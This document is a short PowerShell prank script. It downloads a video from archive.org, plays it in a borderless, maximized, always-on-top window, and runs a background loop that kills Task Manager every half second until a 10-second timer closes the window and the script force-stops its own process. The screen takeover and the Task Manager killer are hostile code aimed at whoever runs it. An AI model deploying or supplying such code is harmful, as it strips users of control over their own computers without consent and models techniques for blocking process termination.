Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase

$url = "https://archive.org/download/youtube-xvFZjo5PgG0/xvFZjo5PgG0.mp4"
$vid = "$env:TEMP\v.mp4"

if (!(Test-Path $vid)) {
    (New-Object System.Net.WebClient).DownloadFile($url, $vid)
}

# 1. Setup the Player
$player = New-Object System.Windows.Controls.MediaElement
$player.Source = $vid
$player.LoadedBehavior = "Play"
$player.Stretch = "UniformToFill"

# 2. Setup the Window
$window = New-Object System.Windows.Window
$window.Content = $player
$window.WindowStyle = "None"
$window.WindowState = "Maximized"
$window.Topmost = $true
$window.Background = "Black"

# 3. The Cleanup Function
$Cleanup = {
    Stop-Job $job -ErrorAction SilentlyContinue
    Stop-Process -Id $PID -Force
}

$timer = New-Object System.Windows.Threading.DispatcherTimer
$timer.Interval = [TimeSpan]::FromSeconds(10)
$timer.Add_Tick({ $window.Close() })
$timer.Start()

# 5. Task Manager Killer
$job = Start-Job -ScriptBlock {
    while($true) { 
        Stop-Process -Name taskmgr -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500 
    }
}

# 6. Safety Hooks
$window.Add_Closed($Cleanup)

# 7. Launch
$window.ShowDialog() | Out-Null
